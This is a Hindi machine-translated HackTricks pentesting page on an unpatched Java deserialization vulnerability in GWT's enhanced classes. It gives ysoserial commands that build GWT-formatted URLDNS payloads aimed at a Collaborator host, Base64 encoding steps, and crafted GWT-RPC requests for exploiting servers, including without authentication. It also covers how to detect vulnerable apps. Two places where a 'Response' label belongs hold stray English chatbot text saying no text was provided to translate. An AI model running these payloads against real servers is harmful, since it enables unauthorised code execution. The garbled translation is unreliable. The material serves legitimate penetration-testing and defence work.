# परिचय

यदि मैं आपको बताऊं कि [GWT, जो कि Google में मूल रूप से विकसित एक काफी लोकप्रिय ओपन-सोर्स वेब एप्लिकेशन फ्रेमवर्क है](https://www.gwtproject.org/), में एक अप्रमाणित Java डिसेरियलाइजेशन संवेदनशीलता शामिल है जिसे 2015 और 2020 में खुले तौर पर चर्चा की गई थी, लेकिन 2023 के अंत तक भी इसे पैच नहीं किया गया था? यदि मैं यह भी सुझाव दूं कि संवेदनशीलता इतनी निम्न स्तर की है कि इस फ्रेमवर्क का उपयोग करके लिखे गए संवेदनशील वेब एप्लिकेशनों को सुरक्षित करना उन एप्लिकेशनों या फ्रेमवर्क के आर्किटेक्चर में परिवर्तन की आवश्यकता हो सकती है?

यदि आप मेरे जैसे हैं, तो आपकी प्रारंभिक प्रतिक्रिया अविश्वास होगी। निश्चित रूप से एक संवेदनशीलता जो एप्लिकेशन मालिकों को अप्रमाणित हमलावरों द्वारा सर्वर-साइड कोड निष्पादन के लिए उजागर कर सकती है, उसे खोजे जाने के आठ साल से कम समय में पैच किया जा चुका होगा। यदि कोई पैच जारी नहीं किया गया था, तो कम से कम संवेदनशील फ्रेमवर्क सुविधाओं को पुराना घोषित किया गया होगा, और फ्रेमवर्क दस्तावेज़ीकरण में संवेदनशील कोड को अद्यतन विकल्पों के साथ बदलने के लिए सुझाव दिए गए होंगे। कम से कम, फ्रेमवर्क डेवलपर्स ने निस्संदेह "शुरुआत कैसे करें" ट्यूटोरियल और अन्य दस्तावेज़ीकरण को अद्यतन किया होगा ताकि संवेदनशील सुविधाओं का उपयोग करने के बजाय कार्यक्षमता को हाइलाइट करने के बजाय उनका उपयोग करने के निहित खतरे को इंगित किया जा सके।

जितना आश्चर्यजनक हो, इनमें से कोई भी मान्यताएं सच नहीं हैं। आठ साल बाद भी, संवेदनशीलता अभी भी पैच नहीं की गई है, और इस ब्लॉग पोस्ट से पहले खतरे के केवल संकेत [2020 का एक GitHub मुद्दा "WONTFIX" शैली प्रतिक्रिया के साथ](https://github.com/gwtproject/gwt/issues/9709), [2015 के कुछ Google Groups चर्चाएं जो कभी भी मूल मुद्दे को ठीक करने के लिए नहीं ले गईं](https://groups.google.com/g/google-web-toolkit/c/j36D9-11JF4/m/OZwNQgvSAgAJ), और [2015 का एक ब्लॉग पोस्ट जो सही तरीके से सुझाव देता है कि मुद्दे को सीरियलाइज़ किए गए डेटा को हस्ताक्षरित करके हल किया जा सकता है](https://gwtnews.blogspot.com/2015/11/re-java-deserialization-vulnerability\_55.html), सिवाय इसके कि GWT में कभी भी ऐसी कार्यक्षमता जोड़ी नहीं गई। वास्तव में [2020 का एक ब्लॉग पोस्ट गलत तरीके से दावा करता है कि GWT संवेदनशील नहीं है](https://gwtnews.blogspot.com/2020/06/re-security-vulnerabilities-with-gwt\_52.html), क्योंकि यह कथित रूप से कभी भी नेटवर्क पर सीरियलाइज़ किए गए Java ऑब्जेक्ट्स को प्रसारित नहीं करता है।

इस ब्लॉग पोस्ट में, मैं GWT में संवेदनशीलता की व्याख्या करूंगा (मूल रूप से "Google Web Toolkit", कभी-कभी "GWT Web Toolkit" के रूप में संदर्भित), आपको दिखाऊंगा कि कैसे एक संवेदनशील GWT वेब एप्लिकेशन का शोषण करना है, आपको यह दिखाने के लिए कि कैसे एक जानबूझकर संवेदनशील GWT वेब एप्लिकेशन को परीक्षण के लिए सेटअप करना है, यह निर्धारित करना कि क्या आपका अपना GWT-आधारित एप्लिकेशन संवेदनशील है, और संभावित शमन पर चर्चा करना।

## **GWT और एन्हांस्ड क्लासेस**

GWT डेवलपर्स को (अन्य चीजों के अलावा) Java में वेब एप्लिकेशन लिखने की अनुमति देता है जिसमें कुछ तर्क सर्वर (Tomcat, Jetty, आदि) पर और कुछ उपयोगकर्ताओं के वेब ब्राउज़रों में चलते हैं। GWT SDK जब Java प्रोजेक्ट संकलित होता है तो किसी भी आवश्यक क्लाइंट-साइड JavaScript कोड का उत्पादन करता है। इस उद्देश्य के लिए GWT में एक प्रकार का मिनी-JRE जावास्क्रिप्ट में लिखा गया है। आम तौर पर, GWT क्लाइंट और सर्वर दोनों के लिए कस्टम Java ऑब्जेक्ट्स को संकलित करता है, और वे ऑब्जेक्ट्स एक पाइप-विभाजित पाठ सीरियलाइजेशन प्रारूप का उपयोग करके आदान-प्रदान किए जाते हैं जिसे दोनों पक्ष पार्स कर सकते हैं। उदाहरण के लिए, निम्नलिखित अनुरोध में `String` ऑब्जेक्ट्स की एक सरणी और एक `CustomClass1` ऑब्जेक्ट शामिल है, और उन ऑब्जेक्ट्स का वर्णन करने वाले गुणों को स्ट्रिंग्स या अंकों के रूप में दर्शाया गया है:
```
POST /stockwatcher/stockPrices HTTP/1.1
…omitted for brevity…

7|0|8|http://10.1.10.161:8888/stockwatcher/|18FD06825EC4CA84A7FDA272DEDDAFBB|com.google.gwt.sample.stockwatcher.client.StockPriceService|getPrices|[Ljava.lang.String;/2600011424|com.google.gwt.sample.stockwatcher.client.CustomClass1/769391051|a|b|1|2|3|4|2|5|6|5|0|6|0|7|8|
```
**चित्र 1** - मानव-पठनीय ऑब्जेक्ट डेटा के साथ उदाहरण GWT-RPC अनुरोध

हालांकि, [GWT में "एन्हांस्ड क्लासेस" नामक एक अवधारणा भी है](https://www.gwtproject.org/doc/latest/DevGuideServerCommunication.html#DevGuideSerializableTypes), जो (उच्च स्तर पर) जावा ऑब्जेक्ट्स होते हैं जो कुछ मानदंडों को पूरा करते हैं (विशेषताओं को समझने के लिए लिंक किए गए दस्तावेज़ की समीक्षा करें)। ये एन्हांस्ड क्लासेस केवल सर्वर-साइड कोड का उपयोग करके प्रोसेस किए जाते हैं, लेकिन एप्लिकेशन स्टेट के हिस्से के रूप में क्लाइंट को भेजे और प्राप्त किए जाते हैं, इसके बावजूद कि वे क्लाइंट के लिए अपारदर्शी होते हैं। आप इसे ASP.NET एप्लिकेशन्स में ViewState के समान मान सकते हैं, सिवाय इसके कि इसमें एन्क्रिप्शन या क्रिप्टोग्राफिक हस्ताक्षर के लिए समर्थन नहीं होता है।

जब एन्हांस्ड क्लासेस चित्र में आते हैं, तो वे GWT अनुरोधों और प्रतिक्रियाओं में Base64 पर आधारित एक गैरमानक संस्करण का उपयोग करके एन्कोड किए जाते हैं। उदाहरण के लिए, निम्नलिखित अनुरोध में मान `rO0ABXcEAAAAAA==`:
```
POST /stockwatcher/checkCustomClass1 HTTP/1.1
…omitted for brevity…

7|0|9|http://10.1.2.20:8888/stockwatcher/|813E653A29B5DD147027BD9F1DDC06B1|com.google.gwt.sample.stockwatcher.client.CheckCustomClassService|checkCustomClass1|com.google.gwt.sample.stockwatcher.client.CustomClass1/658581322|rO0ABXcEAAAAAA==|com.google.gwt.sample.stockwatcher.client.CustomClass2/69504871|a|b|1|2|3|4|1|5|5|6|7|6|0|0|0|8|9|cd
```
**चित्र 2** - सीरियलाइज़्ड जावा ऑब्जेक्ट के साथ GWT-RPC अनुरोध का उदाहरण

डेटा को डिकोड करने से जावा ऑब्जेक्ट सीरियलाइज़ेशन प्रारूप के उपयोग का पता चलता है (`0xACED` हेडर इसकी पहचान है, और इससे एन्कोडेड संस्करण हमेशा `rO0` से शुरू होता है)। हालांकि, GWT का प्रारूप मानक जावा सीरियलाइज़ेशन से थोड़ा अलग है। उदाहरण के लिए, मान को [`ysoserial`](https://github.com/frohoff/ysoserial) के आउटपुट से बदलने की कोशिश करने पर, सर्वर ऑब्जेक्ट को डिसीरियलाइज़ करने के बजाय त्रुटि संदेश वापस करेगा। उदाहरण के लिए:

* `com.google.gwt.user.client.rpc.IncompatibleRemoteServiceException`
* `java.io.EOFException`
* `java.io.StreamCorruptedException`
* “RPC अनुरोध में बहुत कम टोकन”

इससे एक पेंटेस्टर को लग सकता है कि GWT ऑब्जेक्ट(ओं) को डिसीरियलाइज़ करने से पहले किसी प्रकार का डेटा सत्यापन कर रहा है, और अप्रत्याशित क्लासेस को अस्वीकार कर रहा है, लेकिन यह मान्यता गलत होगी।

स्थिति को और भी बदतर बनाते हुए, यदि किसी एप्लिकेशन का प्रमाणीकरण या अधिकारीकरण कोड GWT एप्लिकेशन के भीतर संभाला जाता है (उदाहरण के लिए एप्लिकेशन सर्वर स्तर पर लागू एक अलग फिल्टर के विपरीत), तो कोई भी डिसीरियलाइज़ेशन भेद्यता अप्रमाणित या अनधिकृत कॉलर्स द्वारा शोषण योग्य है। यह इसलिए है क्योंकि GWT सर्वर-साइड फंक्शन को डेटा पास करने से पहले अनुरोध डेटा को डिसीरियलाइज़ करता है।

## एक भेद्य एप्लिकेशन का शोषण

यदि आपके पास पहले से ही एक लाइव GWT-आधारित एप्लिकेशन है जिसके खिलाफ परीक्षण करने के लिए, तो आप इस खंड में दिए गए चरणों का उपयोग करके इसका शोषण कर सकते हैं। यदि आपके पास मौजूदा एप्लिकेशन तक पहुँच नहीं है, तो नीचे दिए गए "एक उदाहरण भेद्य एप्लिकेशन का निर्माण और परीक्षण के खिलाफ परीक्षण" खंड आपको अभ्यास के लिए जल्दी से एक को तैनात करने के माध्यम से चलेगा।

सबसे पहले, आपको एक डिसीरियलाइज़ेशन पेलोड की आवश्यकता होगी। जैसा कि मैंने इस पोस्ट में पहले उल्लेख किया है, GWT का सीरियलाइज़ेशन जावा मानक प्रारूप पर आधारित है, लेकिन यह एक विशिष्ट पैटर्न का उपयोग करता है जो मानक शोषण उपकरण आउटपुट को काम करने से रोकेगा। स्ट्रीम सीधे एक एकल ऑब्जेक्ट को नहीं बल्कि एक पूर्णांक के साथ शुरू होती है जो स्ट्रीम में फील्ड्स की संख्या को इंगित करता है। प्रत्येक फील्ड के लिए, स्ट्रीम में एक स्ट्रिंग होती है जो फील्ड नाम का प्रतिनिधित्व करती है, और फील्ड मूल्य के लिए एक मनमानी ऑब्जेक्ट।

मुझे ऑब्जेक्ट में आवश्यक जानकारी को प्रीपेंड करने का आसान तरीका नहीं मिला, और `ysoserial` सक्रिय रूप से बनाए रखा नहीं जा रहा था, इसलिए [मैंने एक फोर्क बनाया जो आवश्यक सुविधाओं को जोड़ता है](https://github.com/BishopFox/ysoserial-bf) (और कुछ अतिरिक्त कोड भी शामिल करता है जो अन्य लोगों ने `ysoserial` में शामिल करने के लिए प्रस्तुत किया है)। यह सभी मानक `ysoserial` पेलोड्स को जनरेट कर सकता है (कई ऐसे भी जो मुख्य शाखा में मर्ज नहीं किए गए थे), लेकिन GWT-RPC अनुरोध में उपयोग के लिए उन पेलोड्स को फॉर्मेट करने के लिए एक `--gwt` विकल्प जोड़ता है। `--gwt` विकल्प को एक अतिरिक्त पैरामीटर की आवश्यकता होती है, जो ऑब्जेक्ट स्ट्रीम में शामिल करने के लिए फील्ड नाम है। विशिष्ट फील्ड नाम आमतौर पर महत्वपूर्ण नहीं होता है, लेकिन GWT को पेलोड को मान्य के रूप में पहचानने के लिए कुछ मूल्य निर्दिष्ट किया जाना चाहिए। नीचे दिए गए उदाहरण में, फील्ड का नाम bishopfox होगा:
```bash
$ java -jar target/ysoserial-0.0.6-SNAPSHOT-all.jar \
--gwt bishopfox URLDNS \
"https:// dvc5ng8w4odw47m0a8qk45hdv41vpndc.oastify.com/URLDNS" \
> gwt_urldns.bin
```
**चित्र 3** - GWT-RPC प्रारूप में `URLDNS` पेलोड उत्पन्न करना

GWT-RPC में Base64 का एक अनुकूलित संस्करण का उपयोग होता है जहाँ + चिह्न को $ से बदल दिया गया है, और / चिह्न को \_ से बदल दिया गया है, इसलिए अगला कदम पेलोड को एन्कोड करना है।

कोई मानक Base64 ऑपरेशन्स का उपयोग कर सकता है, लेकिन + को $ के साथ और / को \_ के साथ बदल दें (या इसके विपरीत) एन्कोडेड इनपुट या आउटपुट में। उदाहरण के लिए:
```bash
$ base64 -w0 gwt_urldns.bin \
| sed 's/+/\$/g' \
| sed 's./._.g' \
> gwt_urldns.bin.gwt_b64
```
**चित्र 4** - GWT-RPC अनुरोध में प्रयोग के लिए उदाहरण पेलोड को एन्कोडिंग

बेशक, जनरेशन और एन्कोडिंग को एक ही कमांड में संयोजित किया जा सकता है:
```bash
$ java -jar target/ysoserial-0.0.6-SNAPSHOT-all.jar \
--gwt bishopfox URLDNS \
"https:// dvc5ng8w4odw47m0a8qk45hdv41vpndc.oastify.com/URLDNS" \
| base64 -w0 \
| sed 's/+/\$/g' \
| sed 's./._.g' \
> gwt_urldns.bin.gwt_b64
```
**चित्र 5** - URLDNS पेलोड उत्पन्न करना और एन्कोडिंग

सीरियलाइज्ड ऑब्जेक्ट्स को पायथन में भी एन्कोड और डिकोड किया जा सकता है, `altchars=b'$_'` विकल्प को शामिल करके जब `base64.b64encode` या `base64.b64decode` को कॉल करते समय। उदाहरण के लिए:
```
$ binary_object = base64.b64decode(gwt_rpc_object, altchars=b'$_')
```
**चित्र 6** - पायथन में डेटा एन्कोडिंग

जैसा कि किसी अन्य संदिग्ध जावा डिसेरियलाइजेशन भेद्यता के साथ होता है, मैं `ysoserial URLDNS` पेलोड के साथ शुरुआत करने का सुझाव देता हूँ, जिसे आपके वर्तमान Burp Suite Collaborator होस्ट नाम के आधार पर URL लोड करने के लिए कॉन्फ़िगर किया गया हो।

पेलोड जेनरेट करने और एन्कोड करने के बाद, Burp Suite के Repeater मॉड्यूल जैसे टूल का उपयोग करके मूल मान के बजाय एन्कोडेड पेलोड वाले अनुरोध का संशोधित संस्करण भेजें। यदि सफल होता है, तो आपको संभवतः एक प्रतिक्रिया प्राप्त होगी जो इंगित करती है कि फील्ड नाम अमान्य था:

**अनुरोध**
```
POST /stockwatcher/checkCustomClass1 HTTP/1.1
…omitted for brevity…

7|0|10|http://127.0.0.1:8888/stockwatcher/|259823D3B8B1029302496D0C7E009509|com.google.gwt.sample.stockwatcher.client.CheckCustomClassService|checkCustomClass1|com.google.gwt.sample.stockwatcher.client.CustomClass1/1972642674|rO0ABXcEAAAAAXQACWJpc2hvcGZveHNyABFqYXZhLnV0aWwuSGFzaFNldLpEhZWWuLc0AwAAeHB3DAAAAAI…omitted for brevity…0AAEueHg=|com.google.gwt.sample.stockwatcher.client.CustomClass2/69504871|java.sql.Date/730999118|1|2|1|2|3|4|1|5|5|6|
…omitted for brevity…
```
Since you haven't provided any actual text to translate, I'm unable to proceed with a translation. Please provide the English text you want to be translated into Hindi, and I'll be happy to assist you with a clear and concise translation.
```
HTTP/1.1 200 OK
…omitted for brevity…

//EX[2,1,["com.google.gwt.user.client.rpc.IncompatibleRemoteServiceException/3936916533","java.lang.NoSuchFieldException: bishopfox"],0,7]
…omitted for brevity…
```
**चित्र 7** - अनुरोध और प्रतिक्रिया का उदाहरण

यदि आपने अपने Collaborator होस्टनेम की ओर इशारा करते हुए `URLDNS` पेलोड का उपयोग करके शुरुआत की है, तो आपको यह पुष्टि करने में सक्षम होना चाहिए कि किसी ने उस URL का अनुरोध किया है, या कम से कम DNS नाम का समाधान किया है। ऐसे वातावरण _होते हैं_ जो इतने सुरक्षित होते हैं कि वे सार्वजनिक DNS नामों का समाधान भी नहीं करते हैं, लेकिन वे बहुत असामान्य होते हैं।

किसी अन्य Java deserialization भेद्यता की तरह, महत्वपूर्ण शोषण के लिए सर्वर पर लोड किए गए क्लासेस पर आधारित एक gadget chain की आवश्यकता होती है। [हमारे अनुकूलित `ysoserial` के फोर्क के लिए दस्तावेज़ीकरण में इसके सामान्य-उद्देश्य कमांड निष्पादन gadget chains के लिए जल्दी से पेलोड उत्पन्न करने का एक तरीका शामिल है](https://github.com/BishopFox/ysoserial-bf)।

जैसा कि मैंने "GWT और उन्नत क्लासेस" अनुभाग में ऊपर उल्लेख किया है, GWT अनुरोधों को deserializes करता है इससे पहले कि कोई भी कोड GWT-RPC फंक्शन्स में चलाया जाता है। इसका अक्सर यह मतलब होता है कि एक भेद्य GWT-RPC फंक्शन को बिना क्रेडेंशियल्स के, या कम-विशेषाधिकार वाले क्रेडेंशियल्स के साथ शोषित किया जा सकता है, भले ही GWT-RPC फंक्शन सामान्य रूप से कॉल करते समय प्रमाणीकरण और अधिकारीकरण की आवश्यकता हो। इसलिए, यदि आप पुष्टि करते हैं कि एक फंक्शन भेद्य है, तो बिना प्रमाणीकरण के देखने के लिए परीक्षण करके अनुसरण करें। यदि GWT-RPC फंक्शन सामान्य रूप से उच्च-विशेषाधिकार वाले क्रेडेंशियल्स की आवश्यकता होती है, तो कम-विशेषाधिकार वाले खाते से प्रमाणीकरण डेटा का उपयोग करके शोषण पेलोड भेजने का प्रयास करें, जैसे कि आप जिस उत्पाद का परीक्षण कर रहे हैं उसके लिए एक मुफ्त परीक्षण साइन अप करना।

## एक उदाहरण भेद्य एप्लिकेशन बनाना जिसके खिलाफ परीक्षण किया जा सके

जब मैंने मूल रूप से इस विषय पर शोध शुरू किया था, तो मैं कोई भी ओपन-सोर्स प्रोजेक्ट नहीं पा सका जो GWT का उपयोग भेद्य तरीके से करता हो। GWT उदाहरण प्रोजेक्ट को बनाने के लिए कई मैन्युअल चरणों की आवश्यकता थी, और परिणाम में भेद्य सीरियलाइजेशन तंत्र का उपयोग नहीं किया गया था। GWT-आधारित एप्लिकेशनों का शोषण करने का अभ्यास करना आसान बनाने के लिए, [मैंने GWT उदाहरण प्रोजेक्ट का एक संस्करण बनाया जो न केवल बाइनरी सीरियलाइजेशन का उपयोग करता है, बल्कि कई `ysoserial` gadget chains के लिए भेद्य JAR फाइलें भी शामिल करता है](https://github.com/BishopFox/VulnerableGWTApp)।

ऊपर चर्चा किए गए `ysoserial` के अनुकूलित संस्करण के साथ शामिल कई gadget chains का उपयोग करके एक भेद्य GWT वेब एप्लिकेशन को जल्दी से तैनात करने के लिए "क्विक स्टार्ट" निर्देशों का उपयोग करें।

## क्या मेरा GWT एप्लिकेशन भेद्य है?

यदि आप किसी GWT-आधारित एप्लिकेशन के लिए किसी भी ट्रैफिक में Base64-एन्कोडेड Java क्लासेस देखते हैं, तो एप्लिकेशन लगभग निश्चित रूप से भेद्य है।

यह भी जांचने योग्य है कि एप्लिकेशन के GWT-RPC सीरियलाइजेशन नीति फाइलों में से कोई भी `@ClientFields decorator` शामिल है या नहीं। हर नीति फाइल जिसमें एक या अधिक उदाहरण `@ClientField decorator` के होते हैं, कम से कम एक GWT-RPC विधि को भेद्य होना चाहिए।

सीरियलाइजेशन नीति फाइलें GWT बिल्ड प्रक्रिया के दौरान उत्पन्न की जाती हैं। यदि आपके पास सर्वर-साइड कोड तक पहुंच है, तो `a .gwt.rpc एक्सटेंशन` वाली फाइलों की खोज करें:
```bash
$ find . -type f -iname '*.gwt.rpc'

./war/stockwatcher/259823D3B8B1029302496D0C7E009509.gwt.rpc
./war/stockwatcher/458602FF7418310373EB05D1C5992BC5.gwt.rpc
```
**चित्र 8** - सर्वर पर GWT-RPC नीति फाइलों की खोज करना

यदि एप्लिकेशन के डिजाइन के परिणामस्वरूप एक ऐसी क्लास बनती है जिसे सर्वर को GWT-RPC बाइनरी जावा सीरियलाइजेशन का उपयोग करके आदान-प्रदान करने की आवश्यकता होती है, तो उसमें `@ClientFields decorator` होगा, जैसा कि नीचे दिखाया गया है:
```bash
$ cat war/stockwatcher/259823D3B8B1029302496D0C7E009509.gwt.rpc

…omitted for brevity…
@ClientFields,com.google.gwt.sample.stockwatcher.client.CustomClass1,id,str1,str2,cc2,d
…omitted for brevity…
@ClientFields,com.google.gwt.sample.stockwatcher.client.CustomClass2,str1,str2
…omitted for brevity…
```
**चित्र 9** - `@ClientFields` के साथ सजाए गए कक्षाएं\

यदि आप वेब एप्लिकेशन का शून्य-ज्ञान परीक्षण कर रहे हैं, तो आपको एप्लिकेशन द्वारा प्रयुक्त GWT-RPC स्ट्रॉन्ग नामों को एकत्र करना होगा, फिर उन स्ट्रॉन्ग नामों का उपयोग करके पॉलिसी फाइलों तक पहुँचना होगा। इस उदाहरण अनुरोध में, स्ट्रॉन्ग नाम है `259823D3B8B1029302496D0C7E009509`:
```
POST /stockwatcher/checkCustomClass1 HTTP/1.1
…omitted for brevity…

7|0|10|http://10.1.2.20:8888/stockwatcher/|259823D3B8B1029302496D0C7E009509|com.google.gwt.sample.stockwatcher.client.CheckCustomClassService|checkCustomClass1|com.google.gwt.sample.stockwatcher.client.CustomClass1/1972642674|rO0ABXcEAAAAAA==|com.google.gwt.sample.stockwatcher.client.CustomClass2/69504871|java.sql.Date/730999118|string1 value: 12345|string2 value: 98765|1|2|3|4|1|5|5|6|7|6|0|0|8|P___i17vzAA|0|9|10|
```
**चित्र 10** - GWT-RPC अनुरोध में एक उदाहरण मजबूत नाम

आपके इंटरसेप्टिंग प्रॉक्सी इतिहास में `strongName =` के लिए खोज करना अधिक कुशल हो सकता है, जिससे आपको GWT-जनरेटेड जावास्क्रिप्ट फाइलों की सूची मिल सकती है जो मजबूत नामों का उल्लेख करती हैं, भले ही आपकी वेब एप्लिकेशन के भीतर की गतिविधियों ने जरूरी नहीं कि संवेदनशील तरीकों के लिए ट्रैफिक उत्पन्न किया हो। उदाहरण के लिए:
```
…omitted for brevity…
var $gwt_version = "2.10.0";
var $strongName = '259823D3B8B1029302496D0C7E009509';
…omitted for brevity…
```
**चित्र 11** - GWT वेब एप्लिकेशन जावास्क्रिप्ट फाइल में स्ट्रॉन्ग नाम संदर्भ का उदाहरण

एक बार जब आप एप्लिकेशन के लिए स्ट्रॉन्ग नाम(स) जान जाते हैं, तो पॉलिसी फाइलें उसी डायरेक्टरी में होनी चाहिए, स्ट्रॉन्ग नाम(स) का उपयोग करके नामित की गई होती हैं जिसमें `.gwt.rpc` एक्सटेंशन होता है। उदाहरण के लिए:

**अनुरोध**
```
GET /stockwatcher/259823D3B8B1029302496D0C7E009509.gwt.rpc HTTP/1.1
…omitted for brevity…
```
Since you haven't provided any text to translate, I'm unable to proceed with the translation. Please provide the English text from the file `network-services-pentesting/pentesting-web/gwt-google-web-toolkit.md` that you want to be translated into Hindi.
```
HTTP/1.1 200 OK
…omitted for brevity…
@ClientFields,com.google.gwt.sample.stockwatcher.client.CustomClass1,id,str1,str2,cc2,d
…omitted for brevity…
@ClientFields,com.google.gwt.sample.stockwatcher.client.CustomClass2,str1,str2
…omitted for brevity…
```
**चित्र 12** - अनुरोध और प्रतिक्रिया का उदाहरण

जैसा कि ऊपर दिखाया गया है, उस मजबूत नाम के लिए नीति फ़ाइल में `@ClientFields decorator` के साथ दो कक्षाएं होती हैं।

यह एप्लिकेशन का उपयोग करते समय देखने के लिए ट्रैफ़िक की चेकलिस्ट बनाने का एक शानदार तरीका है। यदि आपने जितनी सुविधाओं का परीक्षण किया है और अभी भी उनमें से एक या अधिक का उपयोग नहीं देखा है, तो आपको या तो स्रोत कोड में गहराई से जाना होगा या शेष GWT-RPC विधियों के लिए मैन्युअल रूप से अनुरोध बनाने पर विचार करना होगा। GWT-RPC सीरियलाइजेशन प्रोटोकॉल जटिल है, इसलिए यह पोस्ट मैन्युअल रूप से अनुरोध बनाने के लिए निर्देश प्रदान नहीं करेगी, लेकिन [ब्रायन स्लेसिंस्की ने 2012 में प्रोटोकॉल के लिए एक अच्छा गाइड लिखा](https://docs.google.com/document/d/1eG0YocsYYbNAtivkLtcaiEE5IOF5u4LUol8-LL0TIKU/edit) जिसे आप संदर्भित कर सकते हैं यदि आप उस विकल्प का पीछा करना चाहते हैं।

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* क्या आप **साइबरसिक्योरिटी कंपनी** में काम करते हैं? क्या आप अपनी **कंपनी का विज्ञापन HackTricks में देखना चाहते हैं**? या क्या आप **PEASS के नवीनतम संस्करण तक पहुँच चाहते हैं या HackTricks को PDF में डाउनलोड करना चाहते हैं**? [**सदस्यता योजनाओं**](https://github.com/sponsors/carlospolop) की जाँच करें!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) की खोज करें, हमारा विशेष [**NFTs**](https://opensea.io/collection/the-peass-family) संग्रह
* [**आधिकारिक PEASS & HackTricks स्वैग**](https://peass.creator-spring.com) प्राप्त करें
* **[**💬**](https://emojipedia.org/speech-balloon/) [**Discord समूह**](https://discord.gg/hRep4RUj7f) में शामिल हों या [**telegram समूह**](https://t.me/peass) या मुझे **Twitter** पर **फॉलो** करें [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **अपनी हैकिंग ट्रिक्स साझा करें, [**hacktricks repo**](https://github.com/carlospolop/hacktricks) और [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) में PRs सबमिट करके.**

</details>
